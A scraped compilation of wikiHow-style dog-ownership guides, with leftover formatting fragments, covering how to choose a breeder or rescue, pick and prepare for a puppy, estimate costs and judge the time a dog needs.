A good breeder will not shy away from questions. She will be happy to provide pedigrees, health certificates, and other information about her puppies.A quality breeder will have a lot of questions for you. Do not be alarmed by this. The breeder simply wants to match the right person with the right puppy. It's a good sign if you get a lot of questions when contacting a breeder. This means the breeder is dedicated to finding good homes for her dogs.A good breeder should also provide some kind of written documentation for you to sign. This usually assures you the breeder will take the dog back in the event any problems occur. The breeder should also provide you a written document proving the puppy's parents have had their hips, eyes, knees, and blood examined by a vet. This is to check the parents for inheritable disorders before breeding them., You should be aware of signs of a bad breeder. You're far more likely to get a dog with health or behavioral problems when going through an unethical breeder.


A breeder's first questions should be about you, your lifestyle, and how you plan to care for your puppy. If a breeder instead asks you how quickly you can buy a dog and then presses you for information about your payment method, this is a bad sign.If a breeder is unwilling to answer questions or provide documents you request, this is also a bad sign. There may be something wrong with his dogs. Your poodle may be at higher risk for inheritable health problems., The terms ""royal poodle"" and ""teacup poodle"" do not signify specific breeds. They're colloquial terms used in the poodle community to signify very big or very small toy poodles.


If a breeder is using these terms to signify breed, he may be trying to trick buyers into thinking they're getting something rare or special. Really, he's just selling dogs that are slightly smaller or larger than average.Also, very small poodles, referred to as ""teacup poodles,"" rarely live a full lifespan. Due their size and fragility, they're more prone to health problems."

Create an area in your house just for the puppy.,
Make your puppy’s area safe.,
Choose a crate for your puppy.,
Purchase bedding to help your dog sleep comfortably.,
Buy equipment for potty training.",How to Prepare for a Puppy1," When you first bring your new puppy home, it is a good idea to keep him within the confines of just one or two rooms at first. Common choices include the kitchen, laundry room, or den. This allows your puppy to explore while keeping him safe. It also makes it easier for you to keep track of your puppy and clean up after him.


If allowed to wander the house freely, a puppy may feel overwhelmed and confused by all the new scents and sounds.
Puppies are more likely to soil an area again after they have an accident in the house, so it is good to keep a close watch on him so that you can take him to go potty when he needs to go.;
, You can puppy-proof the area that you have chosen for your puppy by cleaning it well, removing any wires or other items the puppy may chew, removing ornaments or anything the puppy may bump into or break. Also, make sure that you remove anything from this area you don't want soiled, chewed or scratched.


Keep in mind that puppies will chew anything, electrical cables are no exception. Make sure they are out of your puppy’s reach.
Place all hazardous substances out of your puppy’s reach. This includes cleaning products, medications, vitamins, plants, cat litter boxes, tobacco products, garbage, and anything else that your puppy may try to eat., Crate training is a powerful method to train your puppy, but it is not required. If you do decide to crate train your puppy, choose a crate the puppy can stand up in and lie down with his legs extended. Make sure that there is a soft bed inside the crate as well.


The idea of crate training is to teach the puppy that the crate is his safe place, kind of like a wild dog’s den.
Keep in mind that the crate should never be used as a punishment or a prison. It should be a place where the dog goes willingly for a time-out and where you know he is safe when you aren't with him.Wire crates are ideal because the dog can see everything around him. This helps him to feel more secure.

, Choose bedding that is machine washable and that your puppy can snuggle into. Get at least two sets of bedding. That way one set can be in the wash while the other set is in use.Make sure your puppy is raised slightly off the ground in his bed, so he avoids draughts at floor level.

, Even if you will be taking your puppy outside to a toilet spot, it is also a good idea to provide him with a place to relieve himself indoors in case of an emergency. Puppy pads are useful for this - they are like a large flat, absorbent cloth that you can just throw away.


You can also use newspaper but it is slightly less absorbent, so there is a greater chance that you will end up with some urine on the floor.
It is also a good idea to get some disposable gloves, a disposable kitchen towel, and some disinfectant spray (enzymatic - not ammonia or bleach based) for cleaning up messes.Some dog trainers also recommend getting a timer, and setting it to go off every half hour. Then, every time the timer goes off, take your puppy out for a toilet break.

Consider adopting a Lab.,
Look into a breed-specific Labrador retriever rescue group.,
Ask about a trial period.",How to Select a Labrador Retriever2," Adopting a Lab from a shelter or rescue group is a great thing to do, as these dogs are often loving, loyal animals who through no fault of their own have ended up in a rescue. Just keep in mind that adopting a Lab can mean compromising on little things such as the dog’s color, age, or gender., Most dog breeds have fans who work to ensure that special dog breeds, such as Labradors, have good homes. Check to see if there are any Labrador rescue groups in your area with dogs available for adoption.


You may be able to get contact information for local rescue organizations from your local humane society, veterinarian's office, or pet shop.
Keep in mind that dogs who end up in rescue programs are not there because they are bad. Owners may give up their dogs because of life circumstances such as a divorce, job loss, or physical condition. Other times a dog may end up in a rescue program because the owner did not fully consider the financial and/or time commitment that a dog requires., If you are nervous about adopting a dog, keep in mind that many adoption agencies offer or even require a trial period for qualified adopters. During the trial period, you will be able to take the dog home for a week to see if you are a good match for each other.Even if you do not have to or want to do a trial period, it is important to meet your potential new pet. Spend some time with him or her before you decide if this is the dog for you. Shelters often have special areas for prospective pet owners and their family members (people and pets) to get to know a potential new member.

Use a responsible breeder if you decide to purchase a Lab.,
Request to see the puppies with their mother.,
Meet with the Lab breeder in person.,
Meet your potential puppy.,
Look for signs of good health.,
Review the Lab's health records.",How to Select a Labrador Retriever3," It is important to find a responsible breeder in order to get a healthy, well-socialized Lab. By seeking out a responsible breeder, you can also avoid supporting breeders who do not take good care of their dogs. You can find a responsible breeder by checking with your local American Kennel Club.Try searching the AKC directory for a responsible breeder in your area: https://www.apps.akc.org/apps/clubs/search/index.cfm


, If you decide to go through a breeder, make sure that you visit the breeder and see the pups with the mother. Never buy a puppy if you are not allowed to see the mother, no matter what the excuse. Puppy mills separate puppies from the mother at a young age, so she doesn’t get to nurse them and so that she can get pregnant again.Young pups without a mother are a strong indication that you are dealing with a puppy mill. Do not encourage this immoral trade by purchasing their pups.

, It is a good idea to visit a few different local breeders before deciding who you want to buy your puppy from. Do not buy a puppy from the first breeder you visit. You may even want to expand your search outside of your own local area in order to find the best breeder and puppy for your needs.Never buy from a breeder online without visiting the breeder’s location. If a breeder does not allow you to visit and wants to meet up somewhere else, then this should be a red flag to stay away from this breeder.

Never have a puppy shipped. Shipping puppies is very stressful on them and often results in a sick, frightened puppy when you pick them up from the airport.

, It is a good idea to get to know your potential puppy before you commit. If the breeder does not want you to meet the dog before you commit to buying it, then that should be a warning sign that something is wrong.See how the Lab reacts to you. Try some basic commands see how he responds. See if the puppy is curious and comes to investigate (this is a good sign) or if he cowers in a corner (this is a sign of timidity). Watch how he interacts with the other puppies as well. He should seem playful and energetic., A puppy that has been raised by a responsible breeder will seem healthy, energetic, and well-fed. If the puppy seems lethargic, malnourished, or has other signs of illness like a runny nose, cough, or skin sores, then that will indicate that the puppy is in poor health. Do not purchase a puppy from this breeder., The breeder should be willing to show you the dog’s health records including all immunizations, clearances, and guarantees. If you are getting your dog from a breeder, ask to see the papers for the mother and father of the puppy.


Be aware that Labradors are prone to a number of hereditary diseases which are passed down along the generations. Responsible breeders will try to eliminate these diseases, which involves the breeder submitting their breeding stock to genetic tests and radiographs to work out if they are carriers or at risk of transmitting, certain conditions.
Keep in mind that these tests cost the breeder money, so you will need to pay more for a puppy from screened parents. The payback is that the puppy is less likely to develop serious conditions such as hip dysplasia, elbow dysplasia, or eyesight problems."

Find your local pet store.,
Hop in the car with your dog!,
Look for a toy that best describes your dog's personality.,
Grab the toy and show it to your dog.,
Now for the food.",How to Shop for a Dog," In order to do this, you can use the Internet or a Yellow Book. This can be a general pet store or a place specifically intended for dogs and puppies.;
, The store is bound to let pets in, and you can shake or rattle the toy in front of your dog to see if they like it.

, If they are trained show-dogs, you might want to look for an advanced hoop or fence for them to jump and train in the backyard. If they are casual types of dogs, then you may want to consider a Frisbee or tennis ball.

, If they don't respond, chances are they aren't amused. If they jump for it or bark, then its probably a toy that suits your dog.

, What does your dog usually eat? If they are the beefy-lovers kind of dog, then you should get beef meals (such as Beneful) or meat-flavored bones and chew sticks. If they are the light, vegetarian kinds, you should stick with a veggie gourmet meal.

Select and purchase a high quality food.,
Purchase at least two bowls, one for water and the other for food.,
Give your puppy a substitute for chewing.,
Buy a collar (or harness) and leash that is sized for your puppy.,
Stock up on brushes to groom your puppy.,
Get a dog-safe toothbrush and some dog-safe toothpaste.",How to Prepare for a Puppy2," Make sure that the food you choose for your puppy is formulated for puppies and that it is appropriate for your dog’s breed. Talk to your vet about what dog foods have the best quality ingredients for your puppy and ask for recommendations about how much and how often to feed your puppy.Puppies require more frequent feedings than adult dogs. That means that you will have to feed your puppy three meals per day until he reaches 18 weeks. Then you can switch to two meals per day.Provide treats for your puppy as well. Use treats to reinforce your puppy’s good behavior. Doing so will also improve your bond with your new puppy.Be consistent with the type of food you feed your puppy. Changing his food overnight can cause severe gastric distress. If you must change him to a new brand, do so gradually. Add about 1/3 of the new food to the old food and increase the amount over the course of a week until you are feeding him only the new food.Keep in mind it is quite difficult to feed a balanced homemade diet to a growing puppy. The balance of calcium and phosphate needs to be exactly right in order to provide for growing bones, and this is difficult for even expert nutritionists to achieve. Remember, wild dogs don't live nearly as long as our pets.

, You will need to have two separate bowls for your puppy’s food and water. Choose bowls that are easy to clean and that are dishwasher safe. It is a good idea to choose ceramic or stainless steel bowls because these cannot be damaged by chewing and they have a smooth surface that does not harbor as much bacteria as plastic bowls.Make sure that your puppy always has access to fresh, clean water. Keep the bowl filled and change his water out every day.

, Puppies have to chew, so always provide something suitable for your puppy to chew on. Make sure that you choose your puppy’s chew toys with care because many toys are not safe for an unsupervised puppy. If your puppy chews a hole in a toy and swallows some plastic, this can lead to a serious bowel obstruction.


Select toys or chews that are suitable for unsupervised access, such as a KONG toy. These toys are designed to be filled with treats to keep your puppy entertained and give him a chewing outlet.Make sure the toy is large enough that it can't be swallowed whole. If you are trying to decide between two toys, buy the larger one., Usually collars come in x-small, small, medium, large, and x-large. Choose a collar and leash that is appropriate for your dog’s size and breed.For example, smaller dog’s will require a lightweight leash, while a large dog may require a harness and heavyweight leash.
Get a retractable leash for walking and 2–4 foot (0.6–1.2 m) leash for training.

, Purchase a soft brush to shine your puppy’s coat and a wire or pin brush to eliminate knots and mats. You may also want to get a comb for detail grooming.Teach your puppy to enjoy being brushed and groomed from day one. Doing so will help you to avoid problems when the dog is an adult.

, Dental disease is very common in dogs due to a lack of dental care in most dogs. Introducing your puppy to a dental care at a young age helps him to accept tooth brushing as normal. This way, you can brush your dog’s teeth daily and ensure that he has good dental health as he grows.Start getting your puppy used to having your fingers in his mouth by putting some chicken broth or peanut butter on one of your fingers and letting him lick it off. Do this a few times and try to rub a finger on his teeth and gums as you do so.
After your puppy gets used to your fingers, start introducing the toothbrush. Try to brush your puppy’s teeth once every day for a couple of minutes.

Try to buy a puppy from a breeder instead of a pet store.,

Observe the litter as a whole.,

Take your new pup to the vet a few days after you bring them home.,
Plan on keeping your new pup at home, except for short visits, until he is 12-16 weeks old.",How to Pick a Puppy from a Litter," While it may be tempting to scoop up the adorable pup in a pet store window, buying a pup this way can be risky. Most pet store puppies are on their own in a small glass cage. So you won’t get the opportunity to see how the pup interacts with his litter mates. This will make it difficult to assess the pup’s personality and demeanor.Most puppies at pet stores have been weaned too early, so they never get the chance to learn how to act from their mother or their litter mates. A pup that is weaned at five or six weeks and shipped to a pet store will have had no guidance from their mother or from a reputable breeder. Without this guidance, there’s a good chance the pup will become fearful or aggressive, rather than a man’s best friend.
You should also know that puppies sold in pet shops were born most of the time in puppy mills (the adult dogs stay in cages all their lives !) and in awful conditions. Do not buy those puppies if you want to put an end to such horrible practices.;
, You don’t want to pick puppies from a litter where the first half of the litter have already been sold. The best pups usually sell first, so try to set up a visit with the breeder right after the litter has been born.Though the breeder likely won’t have you visit the pups until they are 7-8 weeks old, its best to be at the top of the visiting list.


Bring the most practical member of the family with you or a friend you trust. It helps to have someone evaluate the pups with you, as it is a big life decision.
Before the pups are born, keep in contact with the breeder. The breeder should then keep in touch to let you know how the mother is doing and when she expects the litter to be born.

, Ask the breeder which litter this is for the bitch, or mother of the pups. Ideally, you want to buy a pup from the bitch’s third litter by the same stud (or dad). This will ensure the mother has produced healthy pups before with the same father.


The mother of the pup will have a big impact on your pup’s health and personality. A poor bitch will likely produce a weak litter, even with a strong sire, or father. So its important to spend time with the mother of the pups before the litter is born and talk to the breeder about the health of the mother dog.

, A good breeder will be knowledgeable about the general health and demeanor of the litter. The breeder should be confident about the health of the mother pup. They should also allow you to interact with both the mother pup and the litter during your visit.If you seek out a reputable breeder and spend time at their facility, you should now have a pretty good rapport with the breeder. So you can count on her to help you narrow down your choices in the litter. The breeder has watched the puppies grow. So she will know which pups are dominant or more of a handful, and which ones are shy or mischievous.
During your visit, don’t be afraid to ask for the breeder’s opinion about the litter. But, make sure you also do your own checks on the puppies to confirm their health and personality.

, Notice how the pups interact with each other. While you want an active, playful pup, you also want to avoid a pup that is dominant with his litter mates or shy with his littermates.Make sure the puppies are friendly, curious, and trusting around their litter mates and around you. They should crowd at your feet, tug your shoelaces, crawl into your lap, and stare at you. They may even start playing with you and/or begin wrestling with each other.
If there are four puppies and three of them run away or bark suspiciously at you, you may not find the right pup for you in this litter. The fourth puppy, though not aggressive or fearful, may be too shy. Shyness and distrust could be in the pup’s genes, and this could lead to an anti-social personality when the pup becomes an adult.
Don’t let the breeder laugh off the puppies’ shy or aggressive personalities. If the puppies appear too aggressive or too shy, this may be a sign the breeder has not done a great job of breeding them. The breeder should have socializes with the puppies so they are comfortable around people.
Avoid buying the largest or smallest puppy in the litter. Instead, look at the litter size -- generally, the more puppies in the litter, the healthier they will be., Consider the personality type you are looking for in your new dog. Are you and your family interested in an eager to please pup or a more independent pup? Discuss the personality types in the litter with the breeder. There are several personality types for puppies, including:The Bully: the bully pup may seem very social and interactive at first. But notice if she steals toys from other puppies or plays rough. She may also try to scale the enclosure or climb on the backs of her litter mates. These are signs of determination, smarts, and will power, but the bully personality may not fit your home life. You will need to have lots of time to challenge and take care of this puppy. So if you have other demands on your time or a lot of stress in your home life, the bully pup may not be for you or your family.
The Rebel: this type of pup is quick-thinking, fun-loving, and engaging. They may be playful and energetic like a bully pup, but more sensitive and less aggressive. Rebel pups will be personable, without being headstrong. So they are a good match for an active owner or a family with older children.
The Independent Thinker: this type of pup is interactive and playful, but also happy sitting or playing with a toy on their own. These pups are a good match for a home that is stable and calm, possibly with older owners or no children.
The Eager to Please: the eager to please pup may seem obvious. After all, who doesn’t want an eager and excited pup ? But you will need to be a direct and firm owner with eager to please pups. Lots of training and reinforcement will be needed for this personality type. But with good training and discipline, an eager to please pup can show you full cooperation. These pups are great companions for a family.
The Relaxed pup: this personality type may be less intelligent than their siblings, but they will balance play, interaction and sleep well. They will also be a great fit for relaxed, easy going owners. Go for a relaxed pup if their personality fits their breed and you are looking to complement a home environment with young kids.
The Timid pup: also known as the shy pup, these guys are not born with a strong sense of self. So they may creep on their bellies towards you or arch their back in total submission. You may be sucked in by the sweet, timid nature of these pups. But a timid pup will need a lot of time and patience to foster their self-esteem and get them comfortable around others. They are more suitable for single owners with lots of time for training and attention, rather than a family with children.
Keep in mind the breed of the dog will often affect their personality traits and type. Discuss the pups’ personalities with the breeder to get a better sense of how their breed corresponds with their personality.

, Focus on finding a pup that isn’t too energetic but isn’t too shy. While you may have a certain personality type in mind, most families do best with a pup who is neither too bossy or too submissive. Look for a good natured, middle of the road pup who doesn’t growl or bite. You want a confident pup who struts up to you and your family with their ears held high and their tail wagging with excitement.Don’t try to convince yourself you can bring a shy puppy out of his shell. If shyness if hardwired into his genes, a shy pup will grow into a shy adult. A shy adult dog may be difficult to live with and may even snap at you when he is startled or uncomfortable.

, Once you’ve narrowed your search down to a few pups you like, ask the breeder if you can interact with them one by one.


Pick up each puppy, hug and cradle him. If he reacts by squealing and wiggling, this is not a good sign. You may have behavioral issues with a pup who is squeamish or shy about being picked up. But a small struggle at first, followed by quickly settling down and looking at you is a better sign.
Touch the puppies on the paws, mouth, and ears to gauge their reaction. A puppy who has been handled from an early age won’t mind you touching them in these areas.
Sit or kneel on the ground and call the puppy to you. Snap your fingers or pat the ground to get the puppy’s attention. If he comes to you quickly, he may have a strong attachment to people.
If the pup gets distracted and doesn’t come to you right away, he may have an independent personality type. If he doesn’t come to you at all, he may have difficulty forming a bond with people.

, They should be nice and round, not fat, and definitely not skinny. Even a thin breed like Greyhounds and Whippets are little round pups until they are about four months of age.

, A healthy puppy should have clear, bright eyes with no crust or discharge. They should also have clean ears and clean gums and teeth.The pups should also have bright shiny coats and no sign of dirt or debris on their bodies or around their rear ends.
There should be no pus or feces around their genital area.

, Once you have narrowed down your search to one or two pups you like, run two tests on them to make sure their hearing and vision are sound.To run a hearing test, clap your hands behind the pup’s head to ensure they react. Or stamp your feet behind them or drop a set of keys near them. Keep in mind it is difficult to pick a deaf puppy out of a pen that is crowded with other dogs. So try to run this test when the pup is on their own or away from the litter.
To run a vision test, roll a ball within the pup’s field and vision and notice if he reacts to it by approaching it and playing with it.

, A healthy pup will breathe quietly, without coughing or sneezing a lot. There should also be no crust or discharge around the pup’s nostrils.


It’s also important to check that the pup walks and runs normally without limping or seeming stiff or sore. This will ensure they do not have any hip or joint issues that could develop into something worse when they grow into adulthood., Do this by allowing the puppy to mouth your hands. When the puppy works his way to a forceful nip, respond with a high-pitched “Ouch!” Then, observe the puppy’s reaction. If the pup is excited, you may need to repeat this test. Notice if he catches on to your pain response and reacts with fear or concern, rather than excitement.Don’t be too concerned if the pup notes your reaction, stops nipping for a moment, and then returns to chomping on your fingers. This is a normal reaction for a pup.
Pups who respond appropriately to people and dogs when they display pain are more likely to develop into adult dogs with good control over their jaws. Good jaw control means your dog can get into play fights with another dog without causing injury. This also makes them gentler when taking food from people’s hands or when playing with people.
Puppy who react to your pain will also be more obedient to you as their owner.

, Bring a copy of the pup’s vaccination and worming record, as well as any other medical records for the pup. The breeder should provide these for you before you buy the pup.Talk to the vet about puppy care and maintenance.

, Puppies get their immunity to disease from their mothers, but as the pup grows, there is a gap in immunity until he gets all this shots and vaccines. So keep your puppy healthy by limiting his exposure to short trips to the vet until he reaches 16 weeks old."

Explain how having a dog will teach you responsibility.,
Talk about the type of dog you want.",How to Persuade Your Parents to Get a Dog1," Talk to your parents about how having a dog will make you spend more time around the house, and therefore, more time with them. Tell them that having a dog can be fun for the whole family—you can go for walks in the park together, or have a family barbecue in the backyard while throwing a Frisbee to the dog.Ask them to picture how nice it will be to have a family dinner with the dog by your side, or to have a family movie night with the dog sitting at your feet.;
, Are your parents tired of all the time you spend alone in your dark room, staring at your computer or playing video games? Are they always telling you to go outside and enjoy the sunshine? If so, tell them that having a dog will make you spend more time in the park, in the sunlight, and more time getting physical exercise instead of texting your friends or eating junk food.Tell them that having a dog will help you to unplug and have a simpler adolescence or childhood outside with your furry pal.

, Having a dog is therapeutic and people who own dogs have been known to live longer and to be happier. A dog knows when you're upset and can comfort you in times of stress. Dogs are intuitive creatures that know exactly how to cheer up their owners. If your parents spend a lot of time at work, then tell them that having a dog in the house will not only be soothing for everyone but that a dog can keep you company while they're away., Dogs are protectors of their pack, and will take any means necessary to ensure the safety of those they regard as their family. You will feel more secure with a dog around in your house. With some careful training, your dog can learn who is and who isn’t welcome in your home.Homes that have dogs visible inside are much less likely to be robbed. Show your parents that a dog, once trained, will not only be your lifelong companion, but will also be your protector. If you're old enough for your parents to go on vacation without you, tell them how much more secure you'd feel if there was a dog by your side.

, Though you should show your parents that you're capable of having a dog by being responsible, you can also tell them that having a dog will make you an even more responsible and careful person. Here's why:


Having a dog will teach you to follow a routine. You'll have to feed, walk, and play with the dog at certain times.
Having a dog will make you go to bed earlier and wake up earlier so you can walk it. No more staying up until three in the morning staring at your computer or TV screen.
Having a dog will teach you the value of being responsible for another being.

, Do a bit of research to figure out what kind of dog you want and why. Whether you want a small breed dog, like a miniature schnauzer, or a large dog, like a Labrador, explain your reasons for wanting a particular breed of dog. This will show your parents that you have put time and effort into thinking about getting a dog. When you talk with your parents about the type of dog you want, you may also want to:


Tell them about the strong suits and features of a particular breed of dog. Is it known for being easy to train, fiercely loyal, or just really cute?
Explain what works best for training this breed of dog. Show them that you already know what to do to house train and teach the dog basic commands like ""sit"" and ""stay.""
Show them a picture of the dog or dog breed. Showing a picture of the dog to your parents may help to make them much more sympathetic. Who can resist a picture of a cute dog?

Choose a dog whose energy level you can handle.,
Pick a dog of appropriate age for your family.,
Make sure the dog is a good fit for your house.,
Watch the animal interact with your family.,
Decide if you can deal with a dog's issues.",How to Rehome a Rescue Dog1," If you are a relaxed person who prefers cuddling up at home with a blanket and a book, think about getting a more relaxed dog. If you are outside a lot enjoying parks, good weather, and plentiful exercise, you may want a dog who is able to keep up.When looking at dogs, pay attention to their energy. An energetic dog will bound up to you, excited to meet you, while a more laid-back dog may hang back.;
, An elderly dog is a good option if you want a quieter, more mature dog. Puppies are fun to watch and playful, but they take a lot of time and energy. On the other hand, you may have fewer bad habits to correct. A dog that's a couple of years old can still be puppyish but maybe not so rambunctious., If you live in an apartment, you may not want a high-energy large dog. They require constant attention, as well as a good deal of exercise that you may not be able to provide in a small apartment. A high-energy dog does well with a large yard to play in., Rescue dogs in particular may have issues with certain people. For instance, a dog that was abused by a man may decide that it doesn't like all men. Other dogs may not like kids. Therefore, it's important to make sure your whole family meets the dog before bringing it home.Let each family member interact with the dog, petting and playing with it. If it snaps or growls, back off. That may not be a good choice for you.
A rescue worker can also help you judge how a dog is interacting with your kids. They should be able to tell if the dog wouldn't be a good fit.

, If a dog has known issues, such as bathroom issues, aggression problems, or a health problem, think long and hard about whether you are really equipped to handle it. Of course, that dog needs a home, but you won't do it any good by taking it home only to return it a week later because you can't keep up.In that same vein, it's a good idea to take your new dog to the vet right away to be checked out. That way, you know what you're in for in terms of health issues.

They are also more vulnerable to disease, which can lead to major costs down the line.If money is tight, always choose a healthy mutt from a shelter.

Shelter costs vary widely, but you can probably find a dog available for under US $50 (perhaps an older dog or a less popular breed).It's also worth contacting shelters that charge more (under $300): if that price includes vaccinations or spaying/neutering, it could be more cost-effective than paying the vet yourself.;
, Alternatively, look for a low-cost spay/neuter clinic in your area by asking around at shelters, or using online resources such as the ASPCA (in the US) or the RSPCA (in the UK).An ordinary veterinarian typically charges $200, but many cities have options under $100, depending on the dog's size and sex., Any new dog needs a vet visit, and usually vaccinations as well. One estimate puts these costs at $126, but fees can vary widely.The shelter should know which vaccinations each dog needs, and local vets can give you a quote for how much those will cost.

This only covers the initial checkup after adoption. You'll also want to set aside roughly $20 a month for the dog's regular medical checkups. (Schedule them annually unless your vet recommends otherwise.)

, At a minimum, your dog will need a leash, collar, and crate. These add up to $100–$160 as a rough estimate (with larger dogs at the high end), but you'll get a more accurate idea by checking your local pet stores.Some shelters sell supplies as well.

A sturdy plastic crate can double as a travel crate and sleeping crate, saving a little money.
Ask friends who own dogs whether they have any secondhand supplies their dogs have outgrown.
You can often find cheaper deals from drug stores, dollar stores, or online stores than at pet stores.Thrift stores and used good sites are another option, but confirm the item is functional and not too threadbare before buying.

, You can provide basic training to most dogs yourself, if you commit to a few short sessions a week. You'll start with simple commands like ""sit"" or ""come,"" rewarding the dog with praise and a treat the instant it responds. A clicker will make this easier, since the sound helps the dog pinpoint exactly which behavior you are encouraging.

Dogs with severe behavioral issues such as separation anxiety or aggression may require treatment from an animal behaviorist, who can easily bill $400 for a full course.To keep your mind and wallet at peace, choose a relatively well-adjusted dog.

, Even once the set-up costs are out of the way, the dog still needs food, occasional medical checkups, toys, a pet license, and miscellaneous costs from dog toothbrushes to cleaning products. Here's an estimate of minimum costs for each year of dog ownership in the US, in addition to the one-time costs above., A serious medical problem could happen at any point in your dog's life, so be prepared. A recent estimate suggests that full treatment averages $1700.Start saving up in advance, and look into these options:

Ask a local shelter for information on low-cost veterinary services in your area.
Research breed-specific veterinary aid organizations online, such as CorgiAid or Labrador Lifeline.Pet insurance plans are available in some areas, costing on average $473 per year. Be careful, though: if a plan's exceptions include health problems common to your dog breed, it's not worth buying., Just because you can afford a purebred doesn't mean that's the right choice for you. Learn more about your options:

A quality purebred puppy comes with detailed medical and ancestry records, and a breeder who can advise you. Check for a Coefficient of Inbreeding (COI) below 10% — higher can mean more consistent bred traits, but also higher risk of genetic issues.Expect to pay $500 to $3000, depending on breed.Shelters offer adult dogs, which are much less work to raise, and mutts, which are at lower risk for inherited health problems.Get to know the dog before adopting to identify behavioral problems.
Avoid pet stores and discount breeders — most sell ""puppy mill"" dogs which may have significant health and behavior issues., All new dogs should receive a veterinary checkup and vaccinations (if any are due), along with checks for external and internal parasites. Additional tests can help catch health problems, but not everyone thinks screening for disease in a healthy dog ""just in case"" is a good idea. False positives happen, and can lead to unnecessary stress and medical procedures.Consult a trusted vet or get a second opinion to help you determine which of these is recommended:

Basic wellness checks: complete blood count, biochemistry profile, urinalysis, and thyroid hormone testing.Chest or abdominal X-rays if internal issues are suspected, or for older dogs' checkup.
Dog DNA testers can (at least loosely) identify a mutt's parentage, or confirm a purebred's pedigree.If you have a purebred, consider testing for health problems common in that breed. This could mean simple vision and hearing tests, or more specialized genetic testing services.

, Ask your regular vet to recommend an all-hours emergency clinic. Immediate treatment can cost hundreds or thousands of dollars, but it can be the difference between life and death for your pet. Visit the clinic and provide your dog's medical records in advance.

If you'd like to cover all your bases, look for a vet accredited by an emergency care organization, such as the American College of Veterinary Emergency and Critical Care. Accreditation is not required to handle common emergencies, but it does provide assurance that the vet has experience with extra-critical or complex issues., A good pet insurance plan offers the comforting guarantee that you will not need to choose finances over your pet's health. That said, many plans have high deductibles or do not cover common health problems. Read the fine print first, and consult a vet if you have any questions.

Look up common health problems in your dog's breed. If a plan does not cover one of these health problems, it's probably not right for you., Attending obedience classes with your dog isn't mandatory, but it does offer faster and more effective training. Your vet might recommend a trainer, or might offer general advice and suggest your search for local trainers online. Avoid trainers who promote ""dominance"" or ""alpha"" theory, or who endorse physical punishment.Certifications are only a sign of quality if they come from an independent organization that tests for years of experience, such as the CPTD-KA or CDBC.You may be interested in specialized training as well:

In agility competitions, dogs race through an obstacle course following their handlers' body language.Rally is a similar sport focused more on obedience than speed.
Nose work classes train the dog to follow scents and locate objects.
In canine freestyle, dogs perform tricks set to music.
Talk to a doctor about service dog requirements if you have trouble with everyday tasks due to a physical disability, panic attacks, post-traumatic stress, or depression.Service dogs take a year or two to train., From designer dog sweaters to hand-stamped leather collars, the options are limitless for dog owners who enjoy fashion and shopping. To find upscale products, search online for stores and catalogues that advertise as ""dog boutique,"" ""designer dog,"" or ""luxury dog products."", Hundreds of dog-related gadgets exist to make dog care easier or more fun. Look for these online or at pet stores:

A radio-controlled dog door that only opens for your pet.
Electronic puzzle toys that release food at set intervals.
Leashes that safely attach to bikes.
Pet trackers that notify you if your pet escapes, or let you video call your dog.

, Commit to at least half an hour of exercise every day with your dog, plus another hour of care and play. If you are too busy to fit this in, you cannot keep a dog healthy and happy, and you should not get a dog.

Only active, undivided attention counts toward this time. Your dog will also want to spend time with you when you are doing other things around the house.
Some trainers recommend at least three and a half hours of interaction a day for the average dog.You may be able to cut corners here with extra weekend time, or by following the advice below.

, If you know you’ll be short on time, do thorough research in advance so you know what you’re getting into. The best breed for a busy owner has low exercise and social needs, only needs occasional grooming, and is easy to train. A few examples include the bull mastiff, chihuahua, and bulldog., Puppies require a huge amount of time and attention, which is more than you can commit to right now. Get an adult dog instead, or even a calm senior dog., Hire a professional dog walker to stop by your house on work days, or leave your dog at ""doggy day care"". Look into an occasional dog sitter as well if your job involves regular overtime or travel.

This isn't a necessity if your dog is only alone for a few hours, but preventing it from urinating for more than eight hours risks urinary infection.Even if the dog isn't in danger of peeing, though, most dogs will be unhappy if left alone for long stretches every day.

, This isn't a necessity, but training at home takes patience and discipline, which may be in short supply after a long workday. A professional trainer can be a major help, although the most effective classes request that the owner attend as well. Talk to local trainers and see if you can attend for just the first few sessions, or ask your household to attend in rotation.Animal science has proven that positive reinforcement is a more effective form of training than “dominance” or “pack theory” methods., The surest way to find out if you can fit a dog into your lifestyle is to try it for a few days. Consider enrolling in a foster program so you can look after a dog for a few weeks until it is ready for adoption. Alternatively, ask a friend with a dog if you could look after the pet for them for a weekend., Aim for three and a half hours a day, which is a good amount of time to spend interacting with your dog.This isn't a universal rule, but the less you interact with your dog, the higher the chance of boredom or behavior problems.

An hour and a half each day is the bare minimum amount of time to spend with a dog. Even this is only appropriate for a dog with low energy and social needs, such as a calm, older dog.

, Different dog breeds and individuals prefer different activities. Choose one that matches your own lifestyle, so you can enjoy your time together:

For indoor relaxation, choose a more sedate breed such as a greyhound or pug, or an older dog. These still need half an hour of daily exercise to stay healthy, but low-energy dogs can handle a lazy day now and then.If you enjoy running around your neighborhood, an energetic breed such as a retriever or terrier is a great choice of companion.
Hikers should choose a fit dog at least one year old. Short-term energy isn’t enough if you’ll be trekking for several hours: pick a breed with good endurance, such as an Australian shepherd, husky, or lab retriever (with a coat suited to your climate)., Young puppies need someone on-call every hour of the day, and require an exhausting amount of care until about a year of age.If you bring home puppy, expect your free time to disappear for a while. If no one in your household is at home during the day, puppies are probably not right for you.

Young puppies need to pee as often as once every half an hour while they’re not sleeping, and cannot be fully housetrained until six months old.Puppies love to play, but they need sleep even more (up to 20 hours a day when very young).Let them rest, and keep strenuous exercise to no more than 5 minutes per month of age, no more than twice per day.For example, a three month old puppy can handle 15 minutes of exercise, once or twice a day.

, Training a dog can take as little as one or two fifteen-minute sessions a week, but you’ll need to stay disciplined 24/7 to make it effective.There’s no simple goalpost either: your dog may respond to commands well within a few weeks or months, but new behavior issues can always arise.

Introductory obedience classes are great for puppies or untrained dogs. Consider additional classes if training is advancing slowly, or if you encounter challenges you don’t know how to handle.

, The more often a dog pees, the lower the risk of developing a bladder infection.Letting the dog out every four to six hours during the day is ideal.If the dog is home alone for longer than that, train it to use a pad or hire a dog walker. Give the dog lots of attention while you are around, to make up for the long stretches without socialization.

Dogs can become stressed or bored when home alone. Provide stimulating toys, and consider leaving a calm radio station on. If your dog is anxious when you leave, train the dog with “alone sessions” in another room while you are at home., Do you value being able to make spontaneous plans? You might have to pass on that drink after work if you’re the dog’s main caretaker. That said, some introverts find that a friendly dog makes it easier to meet new people and start conversations.

Some of your friends may not want to visit if you have a dog, due to allergies, a phobia, or a dislike of dogs. A poorly trained or anxious dog could make it a challenge to host anyone, even dog lovers.
